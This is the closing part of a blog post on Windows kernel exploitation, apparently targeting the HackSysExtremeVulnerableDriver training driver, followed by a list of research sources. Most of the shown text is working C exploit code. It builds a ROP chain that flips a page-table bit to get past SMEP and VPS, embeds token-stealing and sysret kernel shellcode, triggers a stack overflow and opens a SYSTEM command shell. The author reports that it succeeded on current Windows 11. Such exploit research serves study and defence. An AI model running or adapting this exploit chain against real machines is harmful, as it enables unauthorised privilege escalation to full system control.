</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">GenerateBuffer</span>(<span style="color:#66d9ef">int64_t</span> <span style="color:#f92672">*</span>buffer, <span style="color:#66d9ef">int64_t</span> kernel_base, LPVOID shellcode)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int64_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">259</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int64_t</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Generating buffer to bypass VPS and disable SMEP</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Prepare RDX register for later. This is needed for the XOR operation */</span>
</span></span><span style="display:flex;"><span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3f99ce</span>; <span style="color:#75715e">// pop rdx ; pop rax ; pop rcx ; ret [nt]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000008</span>; <span style="color:#75715e">// Set RDX to 0x08, we will need this to accomplish the XOR
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Setup the call to MiGetPteAddress in order to get the address of the PTE for our
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       userland code. The setup is as follows:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         RAX -&gt; VOID *MiGetPteAddress(
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">           ( RCX == PTE / Userland Code )
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         );
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       Once the call is complete RAX should contain the pointer to our PTE. */</span>
</span></span><span style="display:flex;"><span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xa74d93</span>; <span style="color:#75715e">// pop rcx ; ret     [nt]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int64_t</span>)shellcode;     <span style="color:#75715e">// *shellcode        [nt]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x26b560</span>; <span style="color:#75715e">// MiGetPteAddress() [nt]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Now that we have obtained the PTE address, we can modify the 2nd bit in order to
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       mark the page as a kernel page (U -&gt; K). We can do this using XOR ;) */</span>
</span></span><span style="display:flex;"><span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2ffbfb</span>; <span style="color:#75715e">// sub rax, rdx ; ret                [nt]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xa6f2f5</span>; <span style="color:#75715e">// push rax ; pop rbx ; ret          [nt]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3f99ce</span>; <span style="color:#75715e">// pop rdx ; pop rax ; pop rcx ; ret [nt]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000004</span>; <span style="color:#75715e">// When we XOR the PTE by 0x4 we flip the 2nd bit (U -&gt; K)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2107b2</span>; <span style="color:#75715e">// xor  [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret [nt]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Now we can spray our shellcode address since SMEP and VPS should be bypassed */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0xC</span>; j<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int64_t</span>)shellcode;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Calling shellcode: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, shellcode);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    HANDLE hHEVD                          <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    DWORD bytesReturned                   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int64_t</span> buffer[BUFFER_SIZE]           <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int64_t</span> kernelBaseAddr                <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    LPVOID lpMemory                       <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// python3 sickle.py -p windows/x64/kernel_token_stealer -f c -m pinpoint
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// movabs rax, qword ptr gs:[0x188]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x80\xb8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rax, qword ptr [rax + 0xb8]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x89\xc1</span><span style="color:#e6db74">&#34;</span>                                 <span style="color:#75715e">// mov rcx, rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb2\x04</span><span style="color:#e6db74">&#34;</span>                                     <span style="color:#75715e">// mov dl, 4
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x80\x48\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rax, qword ptr [rax + 0x448]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x2d\x48\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// sub rax, 0x448
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x38\x90\x40\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// cmp byte ptr [rax + 0x440], dl
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\xeb</span><span style="color:#e6db74">&#34;</span>                                     <span style="color:#75715e">// jne 0x1017
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x90\xb8\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rdx, qword ptr [rax + 0x4b8]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x89\x91\xb8\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov qword ptr [rcx + 0x4b8], rdx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// python3 sickle.py -p windows/x64/kernel_sysret -f c -m pinpoint
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// movabs rax, qword ptr gs:[0x188]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\x8b\x88\xe4\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov cx, word ptr [rax + 0x1e4]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\xff\xc1</span><span style="color:#e6db74">&#34;</span>                                 <span style="color:#75715e">// inc cx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\x89\x88\xe4\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov word ptr [rax + 0x1e4], cx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x90\x90\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rdx, qword ptr [rax + 0x90]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x8a\x68\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rcx, qword ptr [rdx + 0x168]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4c\x8b\x9a\x78\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov r11, qword ptr [rdx + 0x178]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\xa2\x80\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rsp, qword ptr [rdx + 0x180]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\xaa\x58\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rbp, qword ptr [rdx + 0x158]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span>                                     <span style="color:#75715e">// xor eax, eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0f\x01\xf8</span><span style="color:#e6db74">&#34;</span>                                 <span style="color:#75715e">// swapgs 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x0f\x07</span><span style="color:#e6db74">&#34;</span>;                                <span style="color:#75715e">// sysretq
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> shellcodeLength <span style="color:#f92672">=</span> (<span style="color:#ae81ff">58</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">71</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    kernelBaseAddr <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetKernelBaseAddress</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Getting a handle on HEVD</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
</span></span><span style="display:flex;"><span>                        (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
</span></span><span style="display:flex;"><span>                        <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                        NULL,
</span></span><span style="display:flex;"><span>                        OPEN_EXISTING,
</span></span><span style="display:flex;"><span>                        FILE_ATTRIBUTE_NORMAL,
</span></span><span style="display:flex;"><span>                        NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Allocating RWX memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    lpMemory <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL,
</span></span><span style="display:flex;"><span>                            shellcodeLength,
</span></span><span style="display:flex;"><span>                            (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
</span></span><span style="display:flex;"><span>                            PAGE_EXECUTE_READWRITE);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Copying shellcode into RWX memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(lpMemory, shellcode, shellcodeLength);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Spraying return address: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpMemory);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">GenerateBuffer</span>(buffer, kernelBaseAddr, lpMemory);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering control code 0x222003</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
</span></span><span style="display:flex;"><span>                    TRIGGER_BUFFER_OVERFLOW_STACK,
</span></span><span style="display:flex;"><span>                    buffer,
</span></span><span style="display:flex;"><span>                    BUFFER_SIZE,
</span></span><span style="display:flex;"><span>                    NULL,
</span></span><span style="display:flex;"><span>                    <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;</span>bytesReturned,
</span></span><span style="display:flex;"><span>                    NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">cmd.exe&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h1 id="exploitation-rip--tearhttpsyoutubezzmg9ryewowsimh-prkm1kze7zvhq">Exploitation (<a href="https://youtu.be/zZMg9ryeWOw?si=mh-PrkM1kze7zVHq">Rip &amp; Tear</a>)</h1>
<p>When writing this post I was so confident in my technique I decided to weaponize it and test it against the latest build of Windows 11, and it worked!</p>
<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/poc.gif" alt="alt text"></p>
<p>It&rsquo;s important to keep in mind I had to perform modifications to the aforementioned information. As an example, Token Stealing Shellcode offsets have changed, this was an interesting observation and I plan to update shellcode within Sickle to perform version checking for accurate structure offsets.</p>
<h1 id="sources">Sources</h1>
<pre tabindex="0"><code>https://connormcgarr.github.io/pte-overwrites/
https://m0uk4.gitbook.io/notebooks/mouka/windowsinternal/find-kernel-module-address-todo
https://wumb0.in/finding-the-base-of-the-windows-kernel.html
https://idafchev.github.io/research/2023/06/30/Vulnerable_Driver_Part2.html
https://fluidattacks.com/blog/hevd-smep-bypass/
https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/#
https://www.coresecurity.com/sites/default/files/2020-06/Windows%20SMEP%20bypass%20U%20equals%20S_0.pdf
https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html
</code></pre>
    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
